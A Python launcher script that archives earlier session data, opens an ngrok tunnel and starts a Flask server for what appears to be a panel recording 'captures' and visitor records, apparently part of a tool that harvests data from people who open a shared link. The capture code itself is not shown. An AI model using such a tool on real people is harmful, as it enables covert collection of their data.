from modules import check
check.dependency()
check.check_started()

from colorama import Back, Fore, Style
from modules import banner, session_store, tunnel

PORT = 2525

banner.banner()

# Every launch starts a new data session: the captures, activity log and
# visitor records of the previous run are moved to storm-web/sessions/<id>/
# so the panel never shows stale data. Nothing is deleted, and the archived
# sessions stay readable from the panel's Media section.
archived_session = session_store.start_new_session()
if archived_session:
    print(Fore.YELLOW + f" [*] Previous session data archived -> storm-web/sessions/{archived_session}" + Style.RESET_ALL)
else:
    print(Fore.GREEN + " [+] No previous session data - starting with a clean panel." + Style.RESET_ALL)

# Setup / ask for ngrok auth token
auth_token = tunnel.setup_auth_token()

# Start ngrok tunnel automatically
print(Fore.YELLOW + " [*] Starting ngrok tunnel..." + Style.RESET_ALL)
public_url = tunnel.start_tunnel(port=PORT, auth_token=auth_token)

print(Fore.YELLOW + " [*] Starting Flask server..." + Style.RESET_ALL)

from app import run_server
try:
    run_server(port=PORT)
except KeyboardInterrupt:
    print(Fore.RED + "\n [!] Shutting down..." + Style.RESET_ALL)
    tunnel.stop_tunnel()
    print(Fore.GREEN + " [+] Ngrok tunnel closed." + Style.RESET_ALL)